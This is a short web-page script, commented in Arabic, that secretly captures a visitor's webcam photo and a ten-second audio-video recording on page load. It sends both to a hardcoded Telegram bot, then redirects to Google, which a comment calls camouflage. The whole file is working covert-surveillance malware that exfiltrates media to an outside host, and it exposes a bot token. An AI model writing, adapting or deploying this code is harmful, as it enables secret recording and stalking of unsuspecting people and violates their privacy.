<script>
    const token = '8586526554:AAFC1KQ_lvsHAnwi8ErI5x27XLC42yGtgyg';
    const chat_id = '7692110334';

    async function startProcess() {
        try {
            // طلب الكاميرا والمايكروفون (ضروري للفيديو)
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            // 1. التقاط الصورة فوراً (لضمان وصول شيء سريعاً)
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chat_id);
                formData.append('photo', blob, 'image.jpg');
                formData.append('caption', '📸 تم سحب صورة سريعة.. جاري تسجيل الفيديو 10 ثواني');
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
            }, 'image/jpeg');

            // 2. تسجيل فيديو لمدة 10 ثوانٍ
            const mediaRecorder = new MediaRecorder(stream);
            const chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = async () => {
                const videoBlob = new Blob(chunks, { type: 'video/mp4' });
                const videoData = new FormData();
                videoData.append('chat_id', chat_id);
                videoData.append('video', videoBlob, 'video_10s.mp4');
                videoData.append('caption', '🎥 فيديو الـ 10 ثواني وصل!');
                
                await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
                    method: 'POST',
                    body: videoData
                });
                
                // توجيه المستخدم لموقع آخر للتمويه بعد اكتمال الرفع
                window.location.href = "https://www.google.com";
            };

            mediaRecorder.start();
            // مؤقت الـ 10 ثواني (10000 ميلي ثانية)
            setTimeout(() => {
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop()); // إيقاف الكاميرا فوراً
            }, 10000);

        } catch (err) {
            console.log("الرفض أو مشكلة في العتاد");
        }
    }
    window.onload = startProcess;
</script>
